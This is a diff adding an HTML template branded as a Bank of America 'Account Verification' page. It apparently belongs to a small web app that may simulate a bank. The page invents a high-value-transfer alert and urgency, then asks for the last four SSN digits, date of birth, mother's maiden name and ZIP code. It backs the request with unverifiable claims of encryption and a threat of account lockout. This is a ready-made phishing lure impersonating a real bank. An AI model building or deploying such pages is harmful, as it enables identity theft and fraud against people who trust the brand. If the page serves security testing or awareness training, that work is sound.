@@ -1,0 +1,77 @@
+{% extends "base.html" %}
+
+{% block title %}Account Verification - Bank of America{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-6 mx-auto">
+        <div class="card">
+            <div class="card-header" style="background-color: #e7f3ff; border-bottom: 1px solid var(--bank-border);">
+                <h4 class="mb-0" style="color: #333;">
+                    <i class="bi bi-shield-check"></i> Account Verification Required
+                </h4>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-exclamation-triangle-fill"></i> 
+                    <strong>High-Value Transfer Detected</strong><br>
+                    For your protection, we need to verify your identity before processing this large transfer.
+                </div>
+                
+                <p>Please provide the following information to verify your account ownership:</p>
+                
+                <form method="POST" action="{{ url_for('security_account_verify') }}">
+                    <div class="mb-3">
+                        <label for="ssn" class="form-label">Last 4 Digits of Social Security Number</label>
+                        <input type="text" class="form-control" id="ssn" name="ssn" 
+                               placeholder="XXXX" maxlength="4" pattern="[0-9]{4}" required autofocus>
+                        <small class="form-text text-muted">
+                            <i class="bi bi-lock"></i> This information is encrypted and secure
+                        </small>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="dob" class="form-label">Date of Birth</label>
+                        <input type="date" class="form-control" id="dob" name="dob" required>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="maiden_name" class="form-label">Mother's Maiden Name</label>
+                        <input type="text" class="form-control" id="maiden_name" name="maiden_name" 
+                               placeholder="Enter maiden name" required>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="zip_code" class="form-label">Billing Zip Code</label>
+                        <input type="text" class="form-control" id="zip_code" name="zip_code" 
+                               placeholder="XXXXX" maxlength="5" pattern="[0-9]{5}" required>
+                    </div>
+                    
+                    <div class="alert alert-info">
+                        <small>
+                            <i class="bi bi-info-circle"></i> 
+                            This information will be verified against our records. 
+                            Multiple failed attempts will temporarily lock your account.
+                        </small>
+                    </div>
+                    
+                    <div class="d-grid">
+                        <button type="submit" class="btn btn-primary btn-lg">
+                            <i class="bi bi-check-circle"></i> Verify Identity
+                        </button>
+                    </div>
+                </form>
+                
+                <hr class="my-4">
+                
+                <div class="text-center">
+                    <small class="text-muted">
+                        <i class="bi bi-shield-fill-check"></i> Your personal information is protected with bank-level encryption
+                    </small>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
